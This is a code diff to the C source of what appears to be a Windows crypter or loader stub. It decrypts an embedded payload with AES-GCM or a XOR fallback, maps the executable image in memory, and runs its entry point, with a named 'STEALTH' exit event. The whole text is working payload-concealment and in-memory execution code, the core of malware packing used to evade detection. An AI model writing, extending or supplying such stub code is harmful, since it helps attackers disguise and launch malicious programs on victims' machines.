@@ -4,13 +4,10 @@
 #include <stddef.h>
 #include <string.h>
 #include <stdarg.h>
-#include "crypto.h"
-#ifdef USE_OPENSSL
-// OpenSSL for AES-GCM (optional; define USE_OPENSSL at compile time)
+// OpenSSL for AES-GCM
 #include <openssl/evp.h>
 #include <openssl/rand.h>
 #include <openssl/err.h>
-#endif
 
 // Lightweight logger shared with the stub log for diagnostics in in-memory mode
 static void tpl_log(const char *fmt, ...) {
@@ -167,46 +164,43 @@ DWORD WINAPI ExecutePayloadThread(LPVOID lpParam) {
     if (!decrypted_payload) { tpl_log("[template] malloc decrypted_payload failed"); return 1; }
     unsigned char key[32];
 
-    int decrypted_ok = 0;
-    if (stored_len >= sizeof(CryptoEnvelope)) {
-        CryptoEnvelope env;
-        memcpy(&env, encrypted_payload, sizeof(env));
-        if (env.version == CRYPTO_VERSION) {
-            size_t ciphertext_len = stored_len - sizeof(CryptoEnvelope);
-            if (ciphertext_len == env.ciphertext_len && ciphertext_len == (size_t)payload_size) {
-                const uint8_t *ciphertext = encrypted_payload + sizeof(CryptoEnvelope);
-                CryptoEnvelope env_use = env;
-                env_use.ciphertext = ciphertext;
-                env_use.ciphertext_len = ciphertext_len;
-                uint8_t key[CRYPTO_KEY_LEN];
-                if (crypto_argon2id_derive((const uint8_t *)key_hex, strlen(key_hex), env_use.salt, CRYPTO_SALT_LEN, env_use.t_cost, env_use.m_cost_kib, env_use.parallelism, key, sizeof(key)) == 0) {
-                    if (crypto_chacha20_poly1305_decrypt(ciphertext, ciphertext_len, key, NULL, 0, &env_use, decrypted_payload) == 0) {
-                        decrypted_ok = 1;
-                    } else {
-                        tpl_log("[template] chacha decrypt failed");
-                    }
-                } else {
-                    tpl_log("[template] argon2id derive failed");
-                }
-                secure_zero(key, sizeof(key));
-            } else {
-                tpl_log("[template] ciphertext length mismatch");
-            }
-        }
-    }
+    // If stored data starts with AESG header, perform AES-GCM decryption
+    if (stored_len >= 4 && memcmp(encrypted_payload, "AESG", 4) == 0) {
+        size_t iv_len = 12; size_t tag_len = 16;
+        if (stored_len < 4 + iv_len + tag_len) { free(decrypted_payload); tpl_log("[template] AESG blob too small"); return 1; }
+        unsigned char *iv = encrypted_payload + 4;
+        unsigned char *tag = encrypted_payload + 4 + iv_len;
+        unsigned char *ciphertext = encrypted_payload + 4 + iv_len + tag_len;
+        size_t ciphertext_len = stored_len - (4 + iv_len + tag_len);
 
-    if (!decrypted_ok) {
-        // Fallback to legacy XOR for backward compatibility
+        if (strlen(key_hex) != 64) { free(decrypted_payload); tpl_log("[template] invalid key_hex length"); return 1; }
+        hex_to_bytes(key_hex, key, 32);
+
+        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+        if (!ctx) { free(decrypted_payload); return 1; }
+        if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) { EVP_CIPHER_CTX_free(ctx); free(decrypted_payload); tpl_log("[template] EVP_DecryptInit_ex (cipher) failed"); return 1; }
+        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN, (int)iv_len, NULL) != 1) { EVP_CIPHER_CTX_free(ctx); free(decrypted_payload); tpl_log("[template] EVP set IV len failed"); return 1; }
+        if (EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv) != 1) { EVP_CIPHER_CTX_free(ctx); free(decrypted_payload); tpl_log("[template] EVP_DecryptInit_ex (key/iv) failed"); return 1; }
+        int outlen = 0;
+        if (ciphertext_len > 0) {
+            if (EVP_DecryptUpdate(ctx, decrypted_payload, &outlen, ciphertext, (int)ciphertext_len) != 1) { EVP_CIPHER_CTX_free(ctx); free(decrypted_payload); tpl_log("[template] EVP_DecryptUpdate failed"); return 1; }
+        }
+        int plaintext_len = outlen;
+        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_TAG, (int)tag_len, (void *)tag) != 1) { EVP_CIPHER_CTX_free(ctx); free(decrypted_payload); tpl_log("[template] EVP set tag failed"); return 1; }
+        if (EVP_DecryptFinal_ex(ctx, decrypted_payload + outlen, &outlen) != 1) { EVP_CIPHER_CTX_free(ctx); free(decrypted_payload); tpl_log("[template] EVP_DecryptFinal_ex failed"); return 1; }
+        plaintext_len += outlen;
+        EVP_CIPHER_CTX_free(ctx);
+        if ((uint64_t)plaintext_len != payload_size) { free(decrypted_payload); secure_zero(key, sizeof(key)); tpl_log("[template] plaintext length mismatch (%d vs %llu)", plaintext_len, (unsigned long long)payload_size); return 1; }
+        secure_zero(key, sizeof(key));
+    } else {
+        // Legacy XOR
         if ((size_t)payload_size > stored_len) { free(decrypted_payload); tpl_log("[template] XOR payload_size exceeds stored_len (%llu > %zu)", (unsigned long long)payload_size, stored_len); return 1; }
         if (strlen(key_hex) != 64) { free(decrypted_payload); tpl_log("[template] invalid key_hex length for XOR"); return 1; }
         hex_to_bytes(key_hex, key, 32);
         memcpy(decrypted_payload, encrypted_payload, (size_t)payload_size);
         for (uint64_t i = 0; i < payload_size; i++) decrypted_payload[i] ^= key[i % 32];
         secure_zero(key, sizeof(key));
-        decrypted_ok = 1;
     }
-
-    if (!decrypted_ok) { free(decrypted_payload); tpl_log("[template] decryption failed"); return 1; }
 
     tpl_log("[template] decrypted payload size=%llu", (unsigned long long)payload_size);
 
@@ -259,12 +253,8 @@ DWORD WINAPI ExecutePayloadThread(LPVOID lpParam) {
     // Execute the payload
     typedef int (WINAPI *WinMain_t)(HINSTANCE, HINSTANCE, LPSTR, int);
     WinMain_t entryPoint = (WinMain_t)((DWORD64)imageBase + ntHeader->OptionalHeader.AddressOfEntryPoint);
-    // NOTE: When load_in_memory=1 the popup was previously missing because this loader
-    // never actually called the GUI payload's WinMain with a visible show flag. We
-    // explicitly invoke the entrypoint here with SW_SHOW to surface UI payloads (e.g.,
-    // message_c.exe) and then signal the exit event so the stub can shut down.
     tpl_log("[template] calling entrypoint at RVA=0x%lx", (unsigned long)ntHeader->OptionalHeader.AddressOfEntryPoint);
-    int result = entryPoint(NULL, NULL, NULL, SW_SHOW);
+    int result = entryPoint(NULL, NULL, NULL, 10); // SW_SHOW
     tpl_log("[template] entrypoint returned %d", result);
 
     HANDLE hEvt = OpenEventA(EVENT_MODIFY_STATE, FALSE, "Global\\STEALTH_EXIT_EVENT");
